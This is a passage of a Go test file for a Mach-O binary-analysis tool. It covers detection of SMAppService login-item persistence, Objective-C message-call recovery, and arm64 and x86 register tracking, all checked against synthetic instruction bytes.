		}
	}
	for _, evidence := range graph.Evidence {
		if evidence.Kind == "service-management-resource-xref" {
			t.Fatalf("ambiguous private candidate evidence was published: %#v", evidence)
		}
	}
}

func TestObjCSMAppServiceOperationIgnoresResourceXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{
		{Name: "other", Start: 0x1000, End: 0x1020, Reachable: true},
		{Name: "install", Start: 0x1100, End: 0x1140, Reachable: true},
	}
	lookup := newMachOCallLookup(&graph, content, "arm64")
	addMachOStringXrefIndexed(lookup, machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "service-management-resource",
			Value:    "com.example.other",
			Resource: behavior.NewResource(behavior.ResourceIdentifier, "com.example.other", behavior.ResourceClassBundleIdentifier),
		},
	})
	stubs := map[uint64]string{
		0x2000: "loginItemServiceWithIdentifier:",
		0x2010: "registerAndReturnError:",
	}
	addObjCMessageStubCallWithContextIndexed(lookup, functions, stubs, 0x1104, 0x2000, machoCallContext{})
	addObjCMessageStubCallWithContextIndexed(lookup, functions, stubs, 0x1110, 0x2010, machoCallContext{})

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("SMAppService operation should not use resource xref from another function: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "macho.service_management_resource" {
			t.Fatalf("resource xref from another function should remain private: %#v", feature)
		}
	}
}

func TestObjCSMAppServiceRegisterOnlyStaysFeature(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "maybeRegister", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "registerAndReturnError:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected register selector to be recognized")
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("register selector without SMAppService factory should stay a feature: %#v", graph.Operations)
	}
}

func TestObjCSMAppServiceUnregisterDoesNotCreatePersistenceOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "uninstall", Start: 0x1000, End: 0x1040, Reachable: true}}
	stubs := map[uint64]string{
		0x2000: "loginItemServiceWithIdentifier:",
		0x2010: "unregisterAndReturnError:",
	}
	addObjCMessageStubCall(&graph, content, functions, stubs, 0x1004, 0x2000, "arm64")
	addObjCMessageStubCall(&graph, content, functions, stubs, 0x1010, 0x2010, "arm64")

	if len(graph.Operations) != 0 {
		t.Fatalf("unregister should not be reported as persistence creation: %#v", graph.Operations)
	}
}

func TestObjCSMAppServiceDoesNotCorrelateAcrossFunctions(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{
		{Name: "factory", Start: 0x1000, End: 0x1020, Reachable: true},
		{Name: "register", Start: 0x1100, End: 0x1120, Reachable: true},
	}
	stubs := map[uint64]string{
		0x2000: "loginItemServiceWithIdentifier:",
		0x2010: "registerAndReturnError:",
	}
	addObjCMessageStubCall(&graph, content, functions, stubs, 0x1004, 0x2000, "arm64")
	addObjCMessageStubCall(&graph, content, functions, stubs, 0x1104, 0x2010, "arm64")

	if len(graph.Operations) != 0 {
		t.Fatalf("SMAppService selectors in different functions should not correlate: %#v", graph.Operations)
	}
}

func TestReadObjectiveCSelectorRefAtVA(t *testing.T) {
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}

	got, ok := readObjectiveCSelectorRefAtVA(file, 0x2000)
	if !ok || got != "dataTaskWithURL:" {
		t.Fatalf("readObjectiveCSelectorRefAtVA() = %q, %v", got, ok)
	}
	if got, ok := readObjectiveCSelectorRefAtVA(file, 0x3000); ok {
		t.Fatalf("non-selref address should not resolve, got %q", got)
	}
}

func TestArm64DirectCallsResolveObjCMessageStubWithoutPCPlusFour(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 4}}
	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data, encodeTestBL(0x1000, 0x1100))
	file := &macho.File{ByteOrder: binary.LittleEndian}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1004}}, nil, map[uint64]string{
		0x1100: "dataTaskWithURL:",
	}, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.message_call" || graph.Features[0].Value != "dataTaskWithURL:" {
		t.Fatalf("missing ObjC message call feature: %#v", graph.Features)
	}
}

func TestArm64DirectCallsRecoverGenericObjCMsgSendSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 12}}
	data := make([]byte, 12)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(1, 0x1000, 0x2000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestLDRXUnsigned(1, 1, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x1008, 0x1100))

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x100c}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.message_call" || graph.Features[0].Value != "sendSynchronousRequest:returningResponse:error:" || graph.Features[0].Qualifiers["via"] != "objc-selref" {
		t.Fatalf("missing generic ObjC message call feature: %#v", graph.Features)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" || graph.Operations[0].SourceFunction != "main" {
		t.Fatalf("missing network operation from generic ObjC message call: %#v", graph.Operations)
	}
}

func TestArm64PointerTrackingRejectsWRegisterForms(t *testing.T) {
	if _, _, _, ok := arm64ADDImmediate(0x11000000); ok {
		t.Fatal("ADD Wd, Wn, #imm must not participate in 64-bit pointer tracking")
	}
	if _, _, _, ok := arm64ADDImmediate(0x91000000); !ok {
		t.Fatal("ADD Xd, Xn, #imm positive control was rejected")
	}
	if _, _, _, ok := arm64LDRUnsignedImmediate(0xb9400000); ok {
		t.Fatal("LDR Wt, [Xn] must not produce a tracked pointer")
	}
	if _, _, _, ok := arm64LDRUnsignedImmediate(0xf9400000); !ok {
		t.Fatal("LDR Xt, [Xn] positive control was rejected")
	}
	for _, instruction := range []uint32{0x18000000, 0x98000000} { // LDR W and LDRSW literal
		if _, _, ok := arm64LDRLiteralTarget(0x1000, instruction); ok {
			t.Fatalf("32-bit/sign-extending literal load %#x must not produce a tracked pointer", instruction)
		}
	}
	if _, _, ok := arm64LDRLiteralTarget(0x1000, 0x58000000); !ok {
		t.Fatal("LDR Xt, label positive control was rejected")
	}
}

func TestArm64PointerTrackingRejectsRegister31(t *testing.T) {
	if _, _, ok := arm64ADRTarget(0x100000000, encodeTestADR(31, 0x100000000, 0x100000020)); ok {
		t.Fatal("ADR XZR must not seed pointer state")
	}
	if _, _, ok := arm64ADRTarget(0x100000000, encodeTestADRP(31, 0x100000000, 0x100002000)); ok {
		t.Fatal("ADRP XZR must not seed pointer state")
	}
	for _, instruction := range []uint32{
		encodeTestADDImmediate(31, 0, 0),
		encodeTestADDImmediate(0, 31, 0),
	} {
		if _, _, _, ok := arm64ADDImmediate(instruction); ok {
			t.Fatalf("ADD involving SP/XZR %#x must not propagate pointer state", instruction)
		}
	}
	for _, instruction := range []uint32{
		encodeTestMOVRegister(31, 0),
		encodeTestMOVRegister(0, 31),
	} {
		if _, _, ok := arm64MOVRegister(instruction); ok {
			t.Fatalf("MOV involving XZR %#x must not propagate pointer state", instruction)
		}
	}
	for _, instruction := range []uint32{
		encodeTestLDRXUnsigned(31, 0, 0),
		encodeTestLDRXUnsigned(0, 31, 0),
	} {
		if _, _, _, ok := arm64LDRUnsignedImmediate(instruction); ok {
			t.Fatalf("LDR involving SP/XZR %#x must not propagate pointer state", instruction)
		}
	}
	if _, _, ok := arm64LDRLiteralTarget(0x1000, 0x5800001f); ok {
		t.Fatal("LDR XZR, label must not seed pointer state")
	}
}

func TestArm64IndirectCallClearsSelectorState(t *testing.T) {
	var graph behavior.Graph
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__objc_selrefs", 0x2000, selrefData),
		testMachOSection("__objc_methname", 0x3000, selectorData),
	}}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(1, 0x1000, 0x2000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestLDRXUnsigned(1, 1, 0))
	binary.LittleEndian.PutUint32(data[8:12], 0xd63f0120) // BLR X9
	binary.LittleEndian.PutUint32(data[12:16], encodeTestBL(0x100c, 0x1100))
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}
	functions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x1010, Reachable: true}}

	count := extractArm64DirectCalls(&graph, artifact.Content{NodeID: "node-1"}, file, text, data, functions, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "arm64")
	if count != 1 || len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("selector state crossed BLR: count=%d features=%#v operations=%#v", count, graph.Features, graph.Operations)
	}
}

func TestArm64DirectCallsDoNotReuseSelectorAfterUnknownWrite(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 16}}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(1, 0x1000, 0x2000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestLDRXUnsigned(1, 1, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestMOVRegister(1, 0))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestBL(0x100c, 0x1100))

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1010}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1 for unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("stale selector should not produce features/operations: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestArm64DirectCallsClearSelectorAfterUnmodeledMultiRegisterWrite(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(1, 0x1000, 0x2000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestLDRXUnsigned(1, 1, 0))
	binary.LittleEndian.PutUint32(data[8:12], 0xa9400440) // LDP X0, X1, [X2]
	binary.LittleEndian.PutUint32(data[12:16], encodeTestBL(0x100c, 0x1100))
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1010}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1 for unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("selector state crossed an unmodeled multi-register write: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestArm64DirectCallsDoNotReuseSelectorAcrossFunctionBoundary(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 12}}
	data := make([]byte, 12)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(1, 0x1000, 0x2000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestLDRXUnsigned(1, 1, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x1008, 0x1100))

	functions := []machoFunction{
		{Name: "prepareSelector", Start: 0x1000, End: 0x1008},
		{Name: "callMessage", Start: 0x1008, End: 0x100c},
	}
	count := extractArm64DirectCalls(&graph, content, file, text, data, functions, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1 for unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("selector state must not cross function boundaries: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestX86DirectCallsRecoverGenericObjCMsgSendSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	mov := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	call := encodeTestX86CALL(0x1000+uint64(len(mov)), 0x1100)
	data := append(mov, call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.message_call" || graph.Features[0].Value != "sendSynchronousRequest:returningResponse:error:" || graph.Features[0].Qualifiers["via"] != "objc-selref" {
		t.Fatalf("missing generic ObjC message call feature: %#v", graph.Features)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" || graph.Operations[0].SourceFunction != "main" {
		t.Fatalf("missing network operation from generic ObjC message call: %#v", graph.Operations)
	}
}

func TestX86IndirectCallClearsSelectorState(t *testing.T) {
	var graph behavior.Graph
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__objc_selrefs", 0x2000, selrefData),
		testMachOSection("__objc_methname", 0x3000, selectorData),
	}}
	mov := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	indirectCall := []byte{0xff, 0xd0} // CALL RAX
	callVA := 0x1000 + uint64(len(mov)+len(indirectCall))
	data := append(append(mov, indirectCall...), encodeTestX86CALL(callVA, 0x1100)...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}
	functions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data)), Reachable: true}}

	count := extractX86DirectCalls(&graph, artifact.Content{NodeID: "node-1"}, file, text, data, functions, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 || len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("selector state crossed indirect CALL: count=%d features=%#v operations=%#v", count, graph.Features, graph.Operations)
	}
}

func TestX86DirectCallsRecoverGenericObjCMsgSendSelectorViaSIBBase(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 0x48)
	binary.LittleEndian.PutUint64(selrefData[0x40:0x48], 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	movSelector := encodeTestX86SIBBaseDisp8(0x8b, 6, 0, 0x40, 4)
	callVA := 0x1000 + uint64(len(leaBase)+len(movSelector))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(leaBase, movSelector...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.message_call" || graph.Features[0].Value != "sendSynchronousRequest:returningResponse:error:" || graph.Features[0].Qualifiers["via"] != "objc-selref" {
		t.Fatalf("missing SIB generic ObjC message call feature: %#v", graph.Features)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" || graph.Operations[0].SourceFunction != "main" {
		t.Fatalf("missing network operation from SIB generic ObjC message call: %#v", graph.Operations)
	}
}

func TestX86DirectCallsRecoverGenericObjCMsgSendSelectorViaBaseNoDisp(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("sendSynchronousRequest:returningResponse:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	movSelector := encodeTestX86BaseNoDisp(0x8b, 6, 0)
	callVA := 0x1000 + uint64(len(leaBase)+len(movSelector))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(leaBase, movSelector...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.message_call" || graph.Features[0].Value != "sendSynchronousRequest:returningResponse:error:" || graph.Features[0].Qualifiers["via"] != "objc-selref" {
		t.Fatalf("missing no-displacement generic ObjC message call feature: %#v", graph.Features)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" || graph.Operations[0].SourceFunction != "main" {
		t.Fatalf("missing network operation from no-displacement generic ObjC message call: %#v", graph.Operations)
	}
}

func TestX86DirectCallsRejectIndexedSIBObjCMsgSendSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 0x48)
	binary.LittleEndian.PutUint64(selrefData[0x40:0x48], 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	movSelector := encodeTestX86SIBBaseDisp8(0x8b, 6, 0, 0x40, 1)
	callVA := 0x1000 + uint64(len(leaBase)+len(movSelector))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(leaBase, movSelector...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1 unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("indexed SIB selector load should remain unresolved: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestX86DirectCallsDoNotReuseSelectorAfterRegisterWrite(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	clobberRSI := []byte{0x48, 0x89, 0xc6}
	callVA := 0x1000 + uint64(len(movSelector)+len(clobberRSI))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(movSelector, clobberRSI...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1 for unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("stale selector should not produce features/operations: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestX86DirectCallsDoNotReuseSelectorAfterXorZero(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	xorESI := []byte{0x31, 0xf6}
	callVA := 0x1000 + uint64(len(movSelector)+len(xorESI))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(movSelector, xorESI...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1 for unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("zeroed selector register should not produce features/operations: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestX86DirectCallsDoNotReuseSelectorAcrossFunctionBoundary(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	callVA := 0x1000 + uint64(len(movSelector))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(movSelector, call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}
	functions := []machoFunction{
		{Name: "prepareSelector", Start: 0x1000, End: callVA},
		{Name: "callMessage", Start: callVA, End: 0x1000 + uint64(len(data))},
	}

	count := extractX86DirectCalls(&graph, content, file, text, data, functions, map[uint64]string{
		0x1100: "_objc_msgSend",
	}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1 for unresolved import stub call", count)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("selector state must not cross function boundaries: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestX86RegisterWriteRecognizesALUDestinationRegister(t *testing.T) {
	reg, size, ok := x86RegisterWrite([]byte{0x31, 0xf6})
	if !ok || reg != 6 || size != 2 {
		t.Fatalf("x86RegisterWrite(xor esi, esi) = reg %d, size %d, ok %v; want rsi, 2, true", reg, size, ok)
	}
	reg, size, ok = x86RegisterWrite([]byte{0x48, 0x31, 0xf6})
	if !ok || reg != 6 || size != 3 {
		t.Fatalf("x86RegisterWrite(xor rsi, rsi) = reg %d, size %d, ok %v; want rsi, 3, true", reg, size, ok)
	}
}

func TestX86RegisterMoveRequires64BitMove(t *testing.T) {
	dst, src, size, ok := x86RegisterMove(encodeTestX86MOVReg(7, 0))
	if !ok || dst != 7 || src != 0 || size != 3 {
		t.Fatalf("x86RegisterMove(mov rdi, rax) = dst %d src %d size %d ok %v; want rdi, rax, 3, true", dst, src, size, ok)
	}
	if _, _, _, ok := x86RegisterMove([]byte{0x89, 0xc7}); ok {
		t.Fatal("32-bit mov edi, eax should not propagate pointer/string state")
	}
}

func TestX86StateHelpersRejectAmbiguousPrefixSequences(t *testing.T) {
	addresses := map[uint8]x86AddressValue{0: {value: 0x2000}}
	canonicalBase := encodeTestX86BaseDisp8(0x8d, 7, 0, 0x40)
	if target, dst, base, size, _, ok := x86BaseRelativeTargetAndReg(canonicalBase, addresses); !ok || target != 0x2040 || dst != 7 || base != 0 || size != len(canonicalBase) {
		t.Fatalf("canonical base-relative LEA was rejected: target=%#x dst=%d base=%d size=%d ok=%v", target, dst, base, size, ok)
	}

	for _, test := range []struct {
		name string
		move []byte
		base []byte
	}{
		{
			name: "multiple_rex",
			move: []byte{0x48, 0x48, 0x89, 0xc7},
			base: append([]byte{0x48}, canonicalBase...),
		},
		{
			name: "rex_before_66",
			move: []byte{0x48, 0x66, 0x89, 0xc7},
			base: []byte{0x48, 0x66, 0x8d, 0x78, 0x40},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			if _, _, _, ok := x86RegisterMove(test.move); ok {
				t.Fatalf("ambiguous-prefix register move was accepted: %x", test.move)
			}
			if _, _, ok := x86RegisterWrite(test.move); ok {
				t.Fatalf("ambiguous-prefix register write was accepted: %x", test.move)
			}
			if _, _, _, _, _, ok := x86BaseRelativeTargetAndReg(test.base, addresses); ok {
				t.Fatalf("ambiguous-prefix base-relative pointer form was accepted: %x", test.base)
			}
			seed := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
			data := append(seed, test.base...)
			xrefs := x86StringXrefs(
				&macho.File{ByteOrder: binary.LittleEndian}, 0x1000, data,
				[]machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}},
